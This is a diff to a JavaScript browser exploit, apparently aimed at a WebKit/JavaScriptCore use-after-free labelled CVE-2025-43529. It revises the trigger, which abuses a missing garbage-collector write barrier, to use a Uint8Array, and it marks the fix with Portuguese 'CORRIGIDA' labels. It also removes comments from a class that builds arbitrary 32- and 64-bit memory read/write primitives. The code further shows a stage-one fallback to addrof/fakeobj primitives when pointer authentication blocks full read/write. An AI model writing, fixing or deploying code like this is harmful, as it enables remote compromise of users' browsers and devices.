@@ -10,7 +10,7 @@
  *
  * Attack flow:
  *   1. Large array pushes object A to old space
- *   2. Create Date 'a' with butterfly (a[0]=1.1), 'b' in eden
+ *   2. Create Uint8Array 'a' with butterfly (a.x=1.1), 'b' in eden
  *   3. Phi: f = flag ? 1.1 : b  →  A.p1 = f makes Phi escape
  *   4. Long loop lets GC mark A and b as Black
  *   5. b.p1 = a — NO WRITE BARRIER! GC misses 'a'
@@ -51,7 +51,6 @@ class ChimeraExploitPrimitive {
   // --- Low-level reads (Coruna interface) ---
 
   read32(addr) {
-    // addr may be a Number (raw uint32 offset) or need BigInt conversion
     const a = typeof addr === "bigint" ? addr : BigInt(addr >>> 0);
     const val = this._read64(a);
     return Number(val & 0xFFFFFFFFn);
@@ -59,7 +58,6 @@ class ChimeraExploitPrimitive {
 
   write32(addr, val) {
     const a = typeof addr === "bigint" ? addr : BigInt(addr >>> 0);
-    // Read current 64-bit, replace lower 32 bits
     const cur = this._read64(a);
     const updated = (cur & 0xFFFFFFFF00000000n) | BigInt(val >>> 0);
     this._write64(a, updated);
@@ -70,7 +68,6 @@ class ChimeraExploitPrimitive {
     if (hi !== undefined) {
       this._write64(a, (BigInt(hi >>> 0) << 32n) | BigInt(lo >>> 0));
     } else {
-      // lo is a BigInt full value
       this._write64(a, typeof lo === "bigint" ? lo : BigInt(lo));
     }
   }
@@ -148,7 +145,7 @@ class ChimeraExploitPrimitive {
 }
 
 // =========================================================================
-// UAF TRIGGER — CVE-2025-43529
+// UAF TRIGGER — CVE-2025-43529 (CORRIGIDA: Uint8Array + a.x = 1.1)
 // =========================================================================
 
 const uafArray = new Array(0x400000).fill(1.1);
@@ -179,7 +176,7 @@ const CONFIG = {
   RECURSIVE_DEPTH: 800,
 };
 
-// Core UAF trigger — must be JIT compiled
+// ==================== TRIGGER UAF CORRIGIDA ====================
 function triggerUAF(flag, k, allocCount) {
     let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
     uafArray[uafArrayIndex] = A;
@@ -211,6 +208,7 @@ function triggerUAF(flag, k, allocCount) {
     // BUG: atribuição sem write barrier (b preto, a branco)
     b.p1 = a;
 }
+// ================================================================
 
 // Stack clearing to remove conservative GC roots
 function recursive(n) { if (n === 0) return; n = n | 0; recursive(n - 1); }
@@ -358,7 +356,6 @@ r.si = async function () {
       };
     } else {
       // Fallback: addrof/fakeobj only, no arbitrary r/w
-      // Provide limited read via addrof-based scanning
       window.log("[STAGE1-CHIMERA] PAC blocks full r/w, using addrof/fakeobj only");
       read64Fn = function(addr) {
         throw new Error("read64 not available — PAC active");
